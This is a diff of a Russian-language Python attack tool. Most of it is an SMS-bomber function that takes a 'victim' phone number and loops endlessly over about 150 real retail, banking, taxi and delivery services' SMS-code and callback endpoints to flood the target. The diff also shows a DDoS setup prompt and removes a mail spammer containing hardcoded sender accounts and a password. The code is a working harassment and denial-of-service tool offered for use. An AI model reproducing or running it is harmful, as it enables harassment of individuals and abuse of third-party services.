@@ -1,9 +1,37 @@
+import requests
+import time
+import colorama
+import os
+import threading
+import socks
+import socket
+import urllib.request
+import zipfile
+import random
+import datetime
+import sys
+import re
+import json
+from colorama import Fore, Back
+from threading import Thread
+from random import randint
+
+def mask(str, maska):
+  if len(str) == maska.count('#'):
+    str_list = list(str)
+    for i in str_list:
+      maska=maska.replace("#", i, 1)
+    return maska0
+
+def clearing():
+  os.system('cls' if os.name=='nt' else 'clear')
+  print (logo)
+
 def setting():
   global url
   global url2
   global urlport
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
+  clearing()
   print ("Введите адрес сайта:")
   url = input(">>>").strip()
   if url == "":
@@ -32,35 +60,655 @@ def setting():
   except:
     urlport = "80"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
   global multiple
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
+  clearing()
   print ("Вставьте число умножения для атаки:")
-  print ("[*] БОЛЬШЕ 1000 ТОЛЬКО ДЛЯ МОЩНЫХ ПК С ХОРОШИМ ИНТЕРНЕТОМ!")
   multiple = int(input(">>>"))
   ddos()
 
 def sms():
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
+  clearing()
   print ('Введите номер жертвы: (7XXXXXXXXX)')
   phone = input ('>>>')
   if len(phone) == 11 or len(phone) == 12 or len(phone) == 13:
     pass
+    phone9 = phone[1:]
   else:
     print ("[!] Неправильный номер.")
     time.sleep(2)
     sms()
-  phone9 = phone[1:]
-  phoneAresBank = "+"+ phone[0]+"("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
-  phone9dostavista =  phone9[:3]+"+"+ phone9[3:6]+"-"+ phone9[6:8]+"-"+ phone9[8:10]
-  phoneOstin = "+"+ phone[0]+"+("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
-  phonePizzahut = "+" + phone[0]+" ("+ phone[1:4]+") "+ phone[4:7]+" "+ phone[7:9]+" "+ phone[9:11]
-  phoneGorzdrav =  phone[1:4]+") "+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
-  namechoose2 = ['Йувер', 'Цукенберг', 'Умерведённый', 'Екажорсеч', 'Нобиль', 'Гопарь', 'Шумерга']
-  name = random.choice (namechoose2)
-  while True:
-    requests.post('http://localhost:1459/attack/start', json={"number_of_cycles":"1000", "phone":phone}, headers={"Accept-Language":"ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Connection":"keep-alive", "Host":"localhost:1459", "Origin":"http://localhost:1459", "Referer":"http://localhost:1459/"})
-    time.sleep(1200)
+  while 1>0:
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"", "surname":"", "patronymic":"", "sex":"m", "birthdate":"..", "phone":phonee, "email":"", "city":""})
+    except:
+      pass
+    try:
+      requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
+    except:
+      pass
+    try:      
+      phonee=mask(str=phone[1:], maska="8(###)###-##-##")
+      requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code", data={"phone": phonee})
+    except:
+      pass
+    try:      
+      requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
+    except:
+      pass
+    try:      
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://yaponchik.net/login/login.php", data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/", "phone": phonee, "code":""})
+    except:
+      pass
+    try:      
+      requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone})
+    except:
+      pass
+    try:  
+      requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone})
+    except:
+      pass
+    try:  
+      requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName":"Антон", "firstName":"Квинси", "middleName":"Промес", "mobilePhone":phone, "email":"QPromes@gmail.com", "smsCode":""})
+    except:
+      pass
+    try:  
+      requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
+    except:
+      pass
+    try:  
+      requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone, "confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) })
+    except:
+      pass
+    try:  
+      requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone, "confirmation_type":"call_code"}) 
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="#(###)###-##-##")
+      requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth", "phone":phonee})
+    except:
+      pass
+    try:  
+      phonee=mask(str=phone, maska="+#(###)###-##-##")
+      requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":phonee, "action":"sendSmsAgain"})
+    except:
+      pass
+    try:  
+      requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": phone})
+    except:
+      pass
+    try:  
+      requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth", json={"doc": {"auth": {"mphone": "+" + phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0", "source": "site", "signature": "undefined",}}}, headers={"Accept": "application/json"})
+    except:
+      pass
+    try:  
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://www.top-shop.ru/login/loginByPhone/", data={"phone": phonee})
+    except:
+      pass
+    try:  
+      phonee=mask(str=phone, maska="8(###)###-##-##")
+      requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code", data={"phone": phonee})
+    except:
+      pass
+    try:  
+      requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone})
+    except:
+      pass
+    try:  
+      requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify":0, "language":"ru", "PhoneRegionCode":"7", "Mobile":phone9, "page":{"pageName":"home", "launchMode":"direct", "trafficType":""}})
+    except:
+      pass
+    try:
+      requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"})
+    except:
+      pass
+    try:
+      phonee=mask(phone, maska="+# (###) ### - ## - ##")
+      requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php", data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callback_phonenumber", "phone": phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="(+#)##########")
+      requests.post("https://www.tanuki.ru/api/", json={"header": {"version": "2.0", "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}", "agent": {"device": "desktop", "version": "undefined undefined"}, "langId": "1", "cityId": "9",}, "method": {"name": "sendSmsCode"}, "data": {"phone": phonee, "type": 1}})
+    except:
+      pass
+    try:
+      requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": phone9, "name": "QPromes"})
+    except:
+      pass
+    try:
+      requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone9, maska="8(###)###-##-##")
+      requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code", data={"phone": phonee})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone9, maska="8 (###) ###-##-##")
+      requests.post("http://sushigourmet.ru/auth", data={"phone": phonee, "stage": 1})
+    except:
+      pass
+    try:
+      requests.post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone})
+    except:
+      pass
+    try:
+      requests.get("https://auth.pizza33.ua/ua/join/check/", params={"callback": "angular.callbacks._1", "email": "QPromes@gmail.com", "password": "QPromes24", "phone": phone9, "utm_current_visit_started": 0, "utm_first_visit": 0, "utm_previous_visit": 0, "utm_times_visited": 0})
+    except:
+      pass
+    try:
+      requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone})
+    except:
+      pass
+    try:
+      requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone9, maska="8-###-###-##-##")
+      requests.post("https://pizzasushiwok.ru/index.php", data={"mod_name": "registration", "tpl": "restore_password", "phone": phonee})
+    except:
+      pass
+    try:
+      requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
+    except:
+      pass
+    try:
+      requests.post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+"+phone, "action": "confirm_mobile"})
+    except:
+      pass
+    try:
+      requests.post("https://shopandshow.ru/sms/password-request/", data={"phone": "+"+phone, "resend": 0})
+    except:
+      pass
+    try:
+      requests.post("https://shafa.ua/api/v3/graphiql", json={"operationName": "RegistrationSendSms", "variables": {"phoneNumber": "+"+phone}, "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"})
+    except:
+      pass
+    try:
+      requests.post("https://shafa.ua/api/v3/graphiql", json={"operationName": "sendResetPasswordSms", "variables": {"phoneNumber": "+"+phone}, "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n    except:..errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
+    except:
+      pass
+    try: 
+      requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": {"login":phone9, "check":True, "crypto":{"captcha":"739699"}}})
+    except:
+      pass
+    try:
+      requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"})
+    except:
+      pass
+    try:
+      requests.post("https://rieltor.ua/api/users/register-sms/", json={"phone": phone, "retry": 0})
+    except:
+      pass
+    try:
+      requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+#(###)###-##-##")
+      requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/", data={"phone": phonee, "alien": "0"})
+    except:
+      pass
+    try:
+      requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code", params={"number": phone})
+    except:
+      pass
+    try:
+      requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone})
+    except:
+      pass
+    try:
+      requests.get("https://sso.cloud.qlean.ru/http/users/requestotp", headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
+    except:
+      pass
+    try:
+      requests.post("https://www.prosushi.ru/php/profile.php", data={"phone": "+"+phone, "mode": "sms"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+#-###-###-##-##")
+      requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": phonee}})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php", data={"AUTH_ACTION": "SEND_USER_CODE", "phone": phonee})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode", data={"phone": phonee})
+    except:
+      pass
+    try:
+      requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone9, maska="8-###-###-##-##")
+      requests.post("https://pizzasushiwok.ru/index.php", data={"mod_name": "call_me", "task": "request_call", "name": "QPromes", "phone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
+    except:
+      pass
+    try:
+      requests.post("https://pizzakazan.com/auth/ajax.php", data={"phone": "+"+phone, "method": "sendCode"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-####")
+      requests.post("https://pizza46.ru/ajaxGet.php", data={"phone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+"+phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+#-###-###-##-##")
+      requests.post("https://paylate.ru/registry", data={"mobile": phonee, "first_name": "QPromes", "last_name": "QPromes", "nick_name": "QPromes", "gender-client": 1, "email": "QPromes@gmail.com", "action": "registry"})
+    except:
+      pass
+    try:
+      requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8"+phone9})
+    except:
+      pass
+    try:
+      requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-####")
+      requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php", data={"name": "Auth.SendPassword", "params[0]": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]})
+    except:
+      pass
+    try:
+      requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.ollis.ru/gql", json={"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone9, maska="8 (###) ###-##-##")
+      requests.get("https://okeansushi.ru/includes/contact.php", params={"call_mail": "1", "ajax": "1", "name": "QPromes", "phone": phonee, "call_time": "1", "pravila2": "on"})
+    except:
+      pass
+    try:
+      requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": phone, "registration": "N"})
+    except:
+      pass
+    try:
+      requests.post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONAL_PHONE]": phone, "code": "", "sendsms": "Выслать код"})
+    except:
+      pass
+    try:
+      requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://auth.multiplex.ua/login", json={"login": phone})
+    except:
+      pass
+    try:
+      requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "QPromes", "phone": phone, "email": "QPromes@gmail.com"})
+    except:
+      pass
+    try:
+      requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": "QPromes", "phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data={"+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone", json={"FirstName": "QPromes", "CellPhone": phone, "Package": "optimal"})
+    except:
+      pass
+    try:
+      requests.post("https://mobileplanet.ua/register", data={"klient_name": "QPromes", "klient_phone": "+"+phone, "klient_email": "QPromes@gmail.com"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ### ## ##")
+      requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonee)
+    except:
+      pass
+    try:
+      requests.get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+"+phone})
+    except:
+      pass
+    try:
+      requests.get("https://menza-cafe.ru/system/call_me.php", params={"fio":"QPromes", "phone":phone, "phone_number":"1"})
+    except:
+      pass
+    try:
+      requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html", data={"user_info[fullname]": "QPromes", "user_info[phone]": phone, "user_info[email]": "QPromes@gmail.com", "user_info[password]": "QPromes24", "user_info[conf_password]": "QPromes24"})
+    except:
+      pass
+    try:
+      requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html", data={"phone": phone, "do": "phone"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# ### ### ## ##")
+      requests.get("https://makimaki.ru/system/callback.php", params={"cb_fio": "QPromes", "cb_phone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"})
+    except:
+      pass
+    try:
+      requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
+    except:
+      pass
+    try:
+      requests.post("https://loany.com.ua/funct/ajax/registration/code", data={"phone":phone})
+    except:
+      pass
+    try:
+      requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle", json={"url": "/api/client/phone_verification", "method": "POST", "data": {"client_id": 5646981, "phone": phone, "alisa_id": 1}, "headers": {"Client-Id": 5646981, "Content-Type": "application/x-www-form-urlencoded"}})
+    except:
+      pass
+    try:
+      requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website"}, json={"Phone":phone, "Type": 1})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="# (###) ###-##-##")
+      requests.post("https://kilovkusa.ru/ajax.php", params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phonee })
+    except:
+      pass
+    try:
+      requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
+    except:
+      pass
+    try:
+      requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://izi.ua/api/auth/register", json={"phone":"+"+phone, "name":"QPromes", "is_terms_accepted":True})
+    except:
+      pass
+    try:
+      requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone":phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+## (###) ###-##-##")
+      requests.post("https://iqlab.com.ua/session/ajaxregister", data={"cellphone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": "QPromes24", "application": "lkp", "login": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2", headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00", "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999), "FirstName": "QPromes", "Gender": "M", "LastName": "QPromes", "SecondName": "QPromes", "Phone": phone9, "Email": "QPromes@gmail.com"})
+    except:
+      pass
+    try:
+      requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/", data={"country": "RU", "csrfmiddlewaretoken": "", "phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+"+phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
+    except:
+      pass
+    try:
+      requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"})
+    except:
+      pass
+    try:
+      requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+    except:
+      pass
+    try:
+      requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
+    except:
+      pass
+    try:
+      requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"})
+    except:
+      pass
+    try:
+      requests.post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONAL_PHONE]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"})
+    except:
+      pass
+    try:
+      requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": phone9}})
+    except:
+      pass
+    try:
+      requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": "+"+phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
+    except:
+      pass
+    try:
+      requests.post("https://friendsclub.ru/assets/components/pl/connector.php", data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://foodband.ru/api?call=calls", data={"customerName": "QPromes", "phone": phonee, "g-recaptcha-response": ""})
+    except:
+      pass
+    try:
+      requests.get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone9, "g-recaptcha-response": ""})
+    except:
+      pass
+    try:
+      requests.post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.flipkart.com/api/6/user/signup/status", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"}, json={"loginId": "+"+phone, "supportAllStates": True})
+    except:
+      pass
+    try:
+      requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://2407.smartomato.ru/account/session", json={"phone": phonee, "g-recaptcha-response": None})
+    except:
+      pass
+    try:
+      requests.post("https://www.etm.ru/cat/runprog.html", data={"m_phone":phone9, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"})
+    except:
+      pass
+    try:
+      requests.get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+## (###) ###-##-##")
+      requests.post("https://e-groshi.com/online/reg", data={"first_name": "QPromes", "last_name": "QPromes", "third_name": "QPromes", "phone": phonee, "password": "QPromes24", "password2": "QPromes24"})
+    except:
+      pass
+    try:
+      requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+"+phone})
+    except:
+      pass
+    try:
+      requests.post("https://api.easypay.ua/api/auth/register", json={"phone": phone, "password": "QPromes24"})
+    except:
+      pass
+    try:
+      requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
+    except:
+      pass
+    try:
+      requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://api.creditter.ru/confirm/sms/send", json={"phone": phonee, "type": "register"})
+    except:
+      pass
+    try:
+      requests.post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num":phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"})
+    except:
+      pass
+    try:
+      requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": phone})
+    except:
+      pass
+    try:
+      requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://cinema5.ru/api/phone_code", data={"phone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+"+phone, "type": "authenticateCode"})
+    except:
+      pass
+    try:
+      requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
+    except:
+      pass
+    try:
+      requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+"+phone,}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone9, maska="(###)###-##-##")
+      requests.post("https://bluefin.moscow/auth/register/", data={"phone": phonee, "sendphone": "Далее"})
+    except:
+      pass
+    try:
+      requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://bartokyo.ru/ajax/login.php", data={"user_phone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://bamper.by/registration/?step=1", data={"phone": "+"+phone, "submit": "Запросить смс подтверждения", "rules": "on"})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone9, maska="(###) ###-##-##")
+      requests.get("https://avtobzvon.ru/request/makeTestCall", params={"to": phonee})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://oauth.av.ru/check-phone", json={"phone": phonee})
+    except:
+      pass
+    try:
+      requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone})
+    except:
+      pass
+    try:
+      phonee=mask(str=phone, maska="+# (###) ###-##-##")
+      requests.post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": phonee, "form[PASSWORD]": "QPromes24", "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"})
+    except:
+      pass
     os.system('cls' if os.name=='nt' else 'clear')
     print (logo)
     print ('[*] Спамер завершён')
@@ -78,112 +726,6 @@ def sms():
       time.sleep(2)
       main()
 
-def mail():
-  global Login
-  global P
-  Login = [
-  "spammerarnold1@gmail.com", 
-  "spammerarnold2@gmail.com",
-  "spammerarnold3@gmail.com",
-  "spammerarnold4@gmail.com",
-  "spammerarnold5@gmail.com",
-  "spammerarnold6@gmail.com"
-  #"spammerarnold7@mail.ru",
-  #"spammerarnold8@mail.ru",
-  #"spammerarnold9@mail.ru",
-  #"spammerarnold10@mail.ru",
-  #"spammerarnold11@mail.ru",
-  #"spammerarnold12@mail.ru",
-  #"spammerarnold13@mail.ru",
-  #"spammerarnold14@mail.ru",
-  #"spammerarnold15@mail.ru",
-  #"spammerarnold16@mail.ru",
-  #"spammerarnold17@mail.ru",
-  #"spammerarnold18@mail.ru",
-  #"spammerarnold19@mail.ru",
-  #"spammerarnold20@mail.ru",
-  #"spammerarnold21@mail.ru",
-  #"spammerarnold22@mail.ru",
-  #"spammerarnold23@mail.ru",
-  #"spammerarnold24@mail.ru",
-  #"spammerarnold25@mail.ru",
-  #"spammerarnold26@mail.ru",
-  #"spammerarnold27@mail.ru",
-  #"spammerarnold28@mail.ru",
-  #"spammerarnold29@mail.ru",
-  #"spammerarnold30@mail.ru"
-  ]
-  P = "454647Ws"
-  mail3()
-def mail3():
-  global To
-  os.system('cls' if os.name=='nt' else 'clear')
